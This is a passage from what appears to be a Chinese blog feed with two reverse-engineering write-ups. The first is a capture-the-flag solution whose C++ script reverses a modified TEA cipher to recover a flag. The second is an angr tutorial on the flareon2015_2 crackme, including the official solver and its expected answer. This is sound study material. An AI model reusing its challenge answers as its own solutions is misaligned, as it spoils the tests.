*((_DWORD *)v25 + (((unsigned __int8)(<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) ^ <span class="number">2</span>) &amp; <span class="number">3</span>));// 生成新密钥</span><br><span class="line">    key4 = *((_DWORD *)v25 + (((unsigned __int8)(<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) ^ <span class="number">1</span>) &amp; <span class="number">3</span>));</span><br><span class="line">    key8 = key5;</span><br><span class="line">    key1 = key5;</span><br><span class="line">    key9 = *((_DWORD *)v25 + (~(unsigned __int8)(<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>));</span><br><span class="line">    key7 = *((_DWORD *)v25 + (((unsigned __int8)(<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) ^ <span class="number">5</span>) &amp; <span class="number">3</span>));</span><br><span class="line">    key6 = *((_DWORD *)v25 + (((unsigned __int8)(<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) ^ <span class="number">6</span>) &amp; <span class="number">3</span>));</span><br><span class="line">    key3 = *((_DWORD *)v25 + (((unsigned __int8)(<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) ^ <span class="number">7</span>) &amp; <span class="number">3</span>));</span><br><span class="line">  }</span><br><span class="line">  v33 = v12;</span><br><span class="line">  v34 = v13;</span><br><span class="line">  v36 = v3;</span><br><span class="line">  s1 = v9;</span><br><span class="line">  v29 = v6;</span><br><span class="line">  v30 = v10;</span><br><span class="line">  v31 = v11;</span><br><span class="line">  v32 = v14;</span><br><span class="line">  v35 = v15;</span><br><span class="line">  byte_CA8 = memcmp(&amp;s1, s2, 36uLL) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> a3;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>一眼tea  又一眼xtea</p><p>算了 算啦  啥也不是  tea系列魔改</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v27 = 1182995140;</span><br><span class="line">s2[0] = 0x7FB3950C883B3AALL;</span><br><span class="line">s2[1] = 0x7AB57E2775BC5959LL;</span><br><span class="line">s2[2] = 0xADA35753C0249800LL;</span><br><span class="line">s2[3] = 0x6E14AF04BF1D493FLL;</span><br><span class="line">// 密文 正好4 * 9 = 36个字节</span><br><span class="line"></span><br><span class="line">v25[0] = 0xE000004DBLL;</span><br><span class="line">v25[1] = 0x2A600000017LL; // 密钥key</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325172016174.png" alt="image-20230325172016174"></p><p>s1-明文 ，  s2- 密文 </p><p><del>cmp 很重要嘿嘿</del></p><p><img src="/2023/03/25/reverse-2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E5%AE%89%E6%81%92WP/image-20230325172744010.png" alt="image-20230325172744010"></p><p>贴exp</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key4; <span class="comment">// edx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> key2; <span class="comment">// r15d</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// r11d</span></span><br><span class="line">    <span class="type">int</span> key3; <span class="comment">// r13d</span></span><br><span class="line">    <span class="type">int</span> key1; <span class="comment">// r12d</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// r10d</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// r9d</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// r8d</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">int</span> v16; <span class="comment">// r12d</span></span><br><span class="line">    <span class="type">int</span> key5; <span class="comment">// [rsp+4h] [rbp-B4h]</span></span><br><span class="line">    <span class="type">int</span> v19; <span class="comment">// [rsp+8h] [rbp-B0h]</span></span><br><span class="line">    <span class="type">int</span> key6; <span class="comment">// [rsp+Ch] [rbp-ACh]</span></span><br><span class="line">    <span class="type">int</span> key7; <span class="comment">// [rsp+10h] [rbp-A8h]</span></span><br><span class="line">    <span class="type">int</span> key8; <span class="comment">// [rsp+14h] [rbp-A4h]</span></span><br><span class="line">    <span class="type">int</span> v23; <span class="comment">// [rsp+18h] [rbp-A0h]</span></span><br><span class="line">    <span class="comment">//__int64 key[2]; // [rsp+28h] [rbp-90h]</span></span><br><span class="line">    __int64 s2[<span class="number">4</span>]; <span class="comment">// [rsp+38h] [rbp-80h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v27; <span class="comment">// [rsp+58h] [rbp-60h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> s1; <span class="comment">// [rsp+5Ch] [rbp-5Ch] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v29; <span class="comment">// [rsp+60h] [rbp-58h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v30; <span class="comment">// [rsp+64h] [rbp-54h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v31; <span class="comment">// [rsp+68h] [rbp-50h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// [rsp+6Ch] [rbp-4Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v33; <span class="comment">// [rsp+70h] [rbp-48h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v34; <span class="comment">// [rsp+74h] [rbp-44h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v35; <span class="comment">// [rsp+78h] [rbp-40h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v36; <span class="comment">// [rsp+7Ch] [rbp-3Ch]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    BYTE mycryp[] = { <span class="number">0xaa</span>, <span class="number">0xb3</span>, <span class="number">0x83</span>, <span class="number">0xc8</span>, <span class="number">0x50</span>, <span class="number">0x39</span>, <span class="number">0xfb</span>, <span class="number">0x7</span>, <span class="number">0x59</span>, <span class="number">0x59</span>, <span class="number">0xbc</span>, <span class="number">0x75</span>, <span class="number">0x27</span>, <span class="number">0x7e</span>, <span class="number">0xb5</span>, <span class="number">0x7a</span>, <span class="number">0x0</span>, <span class="number">0x98</span>, <span class="number">0x24</span>, <span class="number">0xc0</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0xa3</span>, <span class="number">0xad</span>, <span class="number">0x3f</span>, <span class="number">0x49</span>, <span class="number">0x1d</span>, <span class="number">0xbf</span>, <span class="number">0x4</span>, <span class="number">0xaf</span>, <span class="number">0x14</span>, <span class="number">0x6e</span> };</span><br><span class="line"></span><br><span class="line">    v27 = <span class="number">1182995140</span>;</span><br><span class="line">    s2[<span class="number">0</span>] = <span class="number">0x7FB3950C883B3AA</span>LL;</span><br><span class="line">    s2[<span class="number">1</span>] = <span class="number">0x7AB57E2775BC5959</span>LL;</span><br><span class="line">    s2[<span class="number">2</span>] = <span class="number">0xADA35753C0249800</span>LL;</span><br><span class="line">    s2[<span class="number">3</span>] = <span class="number">0x6E14AF04BF1D493F</span>LL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//key[0] = 0xE000004DBLL;</span></span><br><span class="line">    <span class="comment">//key[1] = 0x2A600000017LL;</span></span><br><span class="line">    <span class="type">uint32_t</span> key[] = { <span class="number">0x4DB</span>,<span class="number">0xE</span>,<span class="number">0x17</span>,<span class="number">0x2A6</span> };</span><br><span class="line"></span><br><span class="line">    s1 = {};</span><br><span class="line">    <span class="comment">/*if (a3 &gt; 0x23)</span></span><br><span class="line"><span class="comment">        copy_from_user(&amp;s1, a2, 36LL);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v9 = <span class="number">0xC883B3AA</span>;</span><br><span class="line">    v6 = <span class="number">0x7FB3950</span>;</span><br><span class="line">    v10 = <span class="number">0x75BC5959</span>;</span><br><span class="line">    v11 = <span class="number">0x7AB57E27</span>;</span><br><span class="line">    v14 = <span class="number">0xC0249800</span>;</span><br><span class="line">    v12 = <span class="number">0xADA35753</span>;</span><br><span class="line">    v13 = <span class="number">0xBF1D493F</span>;</span><br><span class="line">    v15 = <span class="number">0x6E14AF04</span>;</span><br><span class="line">    v17 = <span class="number">0x468312C4</span>;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="comment">//sum = 0x4d89114c8;</span></span><br><span class="line"></span><br><span class="line">    sum = (<span class="number">0x67616C66</span> * <span class="number">11</span>);</span><br><span class="line">    <span class="type">int</span> delta = <span class="number">0x67616C66</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//计算轮数</span></span><br><span class="line">    <span class="comment">//int count = 0;</span></span><br><span class="line">    <span class="comment">//while (1)</span></span><br><span class="line">    <span class="comment">//{</span></span><br><span class="line">    <span class="comment">//    sum = sum - delta;</span></span><br><span class="line">    <span class="comment">//    count++;</span></span><br><span class="line">    <span class="comment">//    if (sum == 0)</span></span><br><span class="line">    <span class="comment">//    {</span></span><br><span class="line">    <span class="comment">//        break;</span></span><br><span class="line">    <span class="comment">//    }</span></span><br><span class="line">    <span class="comment">//}</span></span><br><span class="line">    <span class="comment">//printf("%d\n", count);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//轮数为12， 然后解密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> tmp = <span class="number">0</span>; tmp &lt; <span class="number">11</span>; tmp++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (sum != <span class="number">0x67616C66</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//key生成</span></span><br><span class="line">            key1 = *(key + ((sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>));</span><br><span class="line">            key2 = *(key + (((sum &gt;&gt; <span class="number">2</span>) ^ <span class="number">2</span>) &amp; <span class="number">3</span>));</span><br><span class="line">            key3 = *(key + (((sum &gt;&gt; <span class="number">2</span>) ^ <span class="number">1</span>) &amp; <span class="number">3</span>));</span><br><span class="line">            v19 = key1;</span><br><span class="line">            v23 = key1;</span><br><span class="line">            key5 = *(key + (~(sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>));</span><br><span class="line">            key6 = *(key + (((sum &gt;&gt; <span class="number">2</span>) ^ <span class="number">5</span>) &amp; <span class="number">3</span>));</span><br><span class="line">            key7 = *(key + (((sum &gt;&gt; <span class="number">2</span>) ^ <span class="number">6</span>) &amp; <span class="number">3</span>));</span><br><span class="line">            key8 = *(key + (((sum &gt;&gt; <span class="number">2</span>) ^ <span class="number">7</span>) &amp; <span class="number">3</span>));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//初始化key</span></span><br><span class="line">            v23 = <span class="number">14</span>;</span><br><span class="line">            key2 = <span class="number">678</span>;</span><br><span class="line">            key8 = <span class="number">23</span>;</span><br><span class="line">            key3 = <span class="number">1243</span>;</span><br><span class="line">            key1 = <span class="number">14</span>;</span><br><span class="line">            key7 = <span class="number">678</span>;</span><br><span class="line">            v19 = <span class="number">14</span>;</span><br><span class="line">            key5 = <span class="number">23</span>;</span><br><span class="line">            key6 = <span class="number">1243</span>;</span><br><span class="line">        }</span><br><span class="line">        v17 -= (v15 ^ v23) + (v9 ^ sum) ^ (((<span class="number">16</span> * v15) ^ (v9 &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * v9) ^ (v15 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">        v15 -= ((v13 ^ key8) + (sum ^ v17)) ^ (((<span class="number">16</span> * v13) ^ (v17 &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * v17) ^ (v13 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">        v13 -= ((v12 ^ key7) + (v15 ^ sum)) ^ (((<span class="number">4</span> * v15) ^ (v12 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v12) ^ (v15 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">        v12 -= ((v14 ^ key6) + (v13 ^ sum)) ^ (((<span class="number">4</span> * v13) ^ (v14 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v14) ^ (v13 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">        v14 -= ((v11 ^ v19) + (v12 ^ sum)) ^ (((<span class="number">4</span> * v12) ^ (v11 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v11) ^ (v12 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">        v11 -= ((v10 ^ key5) + (sum ^ v14)) ^ (((<span class="number">4</span> * v14) ^ (v10 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v10) ^ (v14 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">        v10 -= ((v6 ^ key2) + (sum ^ v11)) ^ (((<span class="number">4</span> * v11) ^ (v6 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v6) ^ (v11 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">        v6 -= ((v9 ^ key3) + (v10 ^ sum)) ^ (((<span class="number">4</span> * v10) ^ (v9 &gt;&gt; <span class="number">5</span>)) + ((<span class="number">16</span> * v9) ^ (v10 &gt;&gt; <span class="number">3</span>)));</span><br><span class="line">        v9 -= ((v17 ^ key1) + (v6 ^ sum)) ^ (((<span class="number">4</span> * v6) ^ (v17 &gt;&gt; <span class="number">5</span>)) + ((v6 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v17)));</span><br><span class="line">        sum -= <span class="number">0x67616C66</span>;</span><br><span class="line">   </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;v9 + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v9 + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v9 + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v9 + <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;v6 + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v6 + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v6 + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v6 + <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;v10 + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v10 + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v10 + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v10 + <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;v11 + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v11 + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v11 + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v11 + <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;v14 + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v14 + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v14 + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v14 + <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;v12 + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v12 + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v12 + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v12 + <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;v13 + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v13 + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v13 + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v13 + <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;v15 + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v15 + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v15 + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v15 + <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, *((<span class="type">char</span>*)&amp;v17 + <span class="number">0</span>), *((<span class="type">char</span>*)&amp;v17 + <span class="number">1</span>), *((<span class="type">char</span>*)&amp;v17 + <span class="number">2</span>), *((<span class="type">char</span>*)&amp;v17 + <span class="number">3</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encry</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 541c290d-e89f-4539-8d24-2ccbd1ead8ae</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-angr学习-构造堆栈</title>
      <link href="/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/"/>
      <url>/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在突破学习angr使用</p><p>这儿就拿这个例题来写写， 挺好的</p><p>方便我复习</p><p><strong>构造堆栈的核心： 找到函数调用前的exp情况和调用后的esp的情况以及输入的地址</strong></p><p>例题：<a href="https://github.com/angr/angr-doc/tree/master/examples/flareon2015_2">https://github.com/angr/angr-doc/tree/master/examples/flareon2015_2</a></p><h1 id="直接开整"><a href="#直接开整" class="headerlink" title="直接开整"></a>直接开整</h1><p><del>？ 我以为是elf文件</del></p><p><img src="/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/image-20230308095329342.png" alt="image-20230308095329342"></p><p>查下壳</p><p><img src="/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/image-20230308095409904.png" alt="image-20230308095409904"></p><p>拖入ida分析</p><p>函数这么少？？<br><img src="/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/image-20230308095500362.png" alt="image-20230308095500362"></p><p>决定用angr来解题  那么 <strong>想想构造堆栈的核心</strong></p><p>那就找呗</p><p><img src="/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/image-20230308180816232.png" alt="image-20230308180816232"></p><p>可以先看下   官方exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    b = angr.Project(<span class="string">"very_success"</span>, load_options={<span class="string">"auto_load_libs"</span>:<span class="literal">False</span>})</span><br><span class="line">    <span class="comment"># 创建一个angr项目并且金庸CLE自动解析共享库依赖关系（说白了就是不自动加载c函数的库文件）</span></span><br><span class="line">    <span class="comment"># 因为这是一个win的二进制文件， 为了避免调用win的api</span></span><br><span class="line">    <span class="comment"># 我们需要把0小01084设为其实状态， 并且设置好传入的参数</span></span><br><span class="line">    s = b.factory.blank_state(addr=<span class="number">0x401084</span>)</span><br><span class="line">    <span class="comment"># 设置堆栈上的参数</span></span><br><span class="line">    s.memory.store(s.regs.esp+<span class="number">12</span>, s.solver.BVV(<span class="number">40</span>, s.arch.bits))</span><br><span class="line">    s.mem[s.regs.esp+<span class="number">8</span>:].dword = <span class="number">0x402159</span></span><br><span class="line">    s.mem[s.regs.esp+<span class="number">4</span>:].dword = <span class="number">0x4010e4</span></span><br><span class="line">    s.mem[s.regs.esp:].dword = <span class="number">0x401064</span></span><br><span class="line">    <span class="comment"># 为输入存储一个符号字符串， 因为此时的输入是空白的</span></span><br><span class="line">    s.memory.store(<span class="number">0x402159</span>, s.solver.BVS(<span class="string">"ans"</span>, <span class="number">8</span>*<span class="number">40</span>))</span><br><span class="line">    <span class="comment"># 创建模拟执行器</span></span><br><span class="line">    sm = b.factory.simulation_manager(s)</span><br><span class="line">    sm.explore(find=<span class="number">0x40106b</span>, avoid=<span class="number">0x401072</span>)</span><br><span class="line">    <span class="comment"># 打印字符串</span></span><br><span class="line">    found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> found_state.solver.<span class="built_in">eval</span>(found_state.memory.load(<span class="number">0x402159</span>, <span class="number">40</span>), cast_to=<span class="built_in">bytes</span>).strip(<span class="string">b'\0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">assert</span> main() == <span class="string">b'a_Little_b1t_harder_plez@flare-on.com'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(main())</span><br></pre></td></tr></tbody></table></figure><p><strong>为了必满调用win的api， 我们需要把入口设为0小01084</strong></p><blockquote><p> 0x401084为函数sub-401084校验输入的地方</p></blockquote><p>但是这样的话就会跳过sub-401000函数， 所以我们要模仿此函数</p><p><strong>函数调用前后的堆栈</strong></p><p>这道题的关键就在这里</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置堆栈上的参数</span></span><br><span class="line">    s.memory.store(s.regs.esp+<span class="number">12</span>, s.solver.BVV(<span class="number">40</span>, s.arch.bits))</span><br><span class="line">    s.mem[s.regs.esp+<span class="number">8</span>:].dword = <span class="number">0x402159</span></span><br><span class="line">    s.mem[s.regs.esp+<span class="number">4</span>:].dword = <span class="number">0x4010e4</span></span><br><span class="line">    s.mem[s.regs.esp:].dword = <span class="number">0x401064</span></span><br></pre></td></tr></tbody></table></figure><p>至于这一句</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.memory.store(s.regs.esp+<span class="number">12</span>, s.solver.BVV(<span class="number">40</span>, s.arch.bits))</span><br></pre></td></tr></tbody></table></figure><p>这个创建了一个值40 大小为s.arch.bits的BVV（位向量值 也就是输入）</p><p>其中s.arch.bits的值位32（因为这是一个32位的程序）</p><p>接着的话   把该值载入到exp+12的位置上</p><p>为什么呢？ （<strong>逆出来的  图方便 - 抽象 哈哈</strong>）</p><p>因为这个地址对此程序无影响  所以就拿来当作参照物</p><p><strong>保存call sub401084调用后的堆栈情况</strong></p><p><img src="/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/image-20230308182132349.png" alt="image-20230308182132349"></p><p>这儿需要知道[ebp-10h]地址存的啥</p><p>可以动调（笔者这种懒人最喜欢做的事了）</p><p><img 